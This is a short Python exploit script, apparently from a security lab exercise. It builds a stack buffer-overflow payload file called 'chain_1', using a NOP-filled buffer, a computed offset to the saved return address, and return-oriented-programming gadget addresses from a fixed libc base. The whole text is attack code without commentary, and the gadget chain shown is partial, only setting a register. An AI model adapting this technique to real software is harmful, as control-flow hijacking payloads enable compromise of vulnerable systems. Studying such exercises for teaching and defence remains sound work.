#!/usr/bin/python3
import sys

# Initialize the content array
content = bytearray(0x90 for i in range(500))

# The address of libc
libc_addr = 0xb7e08000

# The address of the return address in memory
return_addr_location = 0xbfffe83c

# The address of buffer
buffer_addr = 0xbfffe6c2

# Calculate the offset between buffer address and address of return address
offset = return_addr_location - buffer_addr

# The address of xor eax, eax; ret
xor_eax_eax_ret_addr = 0x0002c7ac + libc_addr

# The address of add eax, 7; ret
add_eax_7_ret_addr = 0x0013fe3f + libc_addr

# Generate the payload
content[offset:offset+4] = (xor_eax_eax_ret_addr).to_bytes(4,byteorder='little')
content[offset+4:offset+16] = (add_eax_7_ret_addr).to_bytes(4,byteorder='little') * 3

# Write the content to chain_1
file = open("chain_1", "wb")
file.write(content)
file.close()